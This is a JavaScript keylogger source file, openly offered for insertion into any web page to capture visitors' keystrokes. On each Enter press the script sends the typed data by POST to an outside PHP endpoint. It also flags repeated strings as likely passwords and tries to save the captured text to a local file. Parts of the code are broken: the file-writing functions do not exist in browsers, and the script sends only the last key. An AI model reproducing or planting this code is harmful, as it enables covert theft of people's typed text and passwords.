//	JavaScript keylogger
//	Insert this script code into any HTML page to get data

//	Written by Johnny Dunn

//	Credit for duplicates function: 
//	http://stackoverflow.com/questions/7376598/in-javascript-how-do-i-check-if-an-array-has-duplicate-values

var keys='';  // declaring a javascript variable to store each keystroke 
var allText = '';
var allTextSplit = [];
var data = "data.txt";

onkeypress = function(e) { // calling the function to execute whenever a keystroke is there on html document  document.onkeypress  is an event handler
	get = window.event?event:e;
 	key = get.keyCode?get.keyCode:get.charCode; //get character code 
 	key = String.fromCharCode(key); // convert it to string 
 	keys+=key; // append current character to previous one (concatinate)
 	if (e.keyCode == 13) {		//	If the user has pressed enter..
 		allText = allText + keys;
 		// console.log(allText);
 		keys = " ";			//	Leave a space after enter to start next string / word
 		splitAllText(allText);
 		console.log(allTextSplit);
      var http = new XMLHttpRequest();
      var param = encodeURI(key)
      http.open("POST","http://jddunn.github.io/keylogger.php",true);
      http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
      http.send("key="+param);
 	}
  	checkSplitText(allTextSplit);
}


// //  This makes the keylogger record strings every second, instead of on pressing 'ENTER'
//  window.setInterval(function(e){			
//  // console.log(keys);
// 	allText = allText + keys;
// 	splitAllText(allText);
// 	keys = " ";
// 	checkSplitText(allTextSplit);
// 	// console.log(allTextSplit);
// }, 1000); // set interval to execute function continuously 


function splitAllText(allText) {
	allTextSplit = allText.split(" ");
	return allTextSplit;
}

function checkSplitText(allTextSplit) {
	var out = [];
	var obj = {};
	for (var i = 0; i < allTextSplit.length; i++) {
	// console.log("New string: " + allTextSplit[i]);
	}
	hasDuplicates(allTextSplit);
	WriteFile(allTextSplit);
}


//	If duplicate values are found, then this string potentially is a password since users had to enter it twice.
function hasDuplicates(allTextSplit) {		
	// console.log(allTextSplit);
    var valuesSoFar = [];
    for (var i = 0; i < allTextSplit.length; ++i) {
        var value = allTextSplit[i];
        if (valuesSoFar.indexOf(value) !== -1) {
        	console.log("Possible password found: " + value);
            // return true;
        }
        valuesSoFar.push(value);
    }
    // return false;
}

function WriteFile() {

	var fh = fopen("C:\\Users\\JD\\Documents\\GitHub\\web-keylogger-analyzer\\data.txt", 3); // Open the file for writing

	if(fh!=-1) { // If the file has been successfully opened 
    	var str = allTextSplit;
    	fwrite(fh, str); // Write the string to a file
    	fclose(fh); // Close the file 
    }
}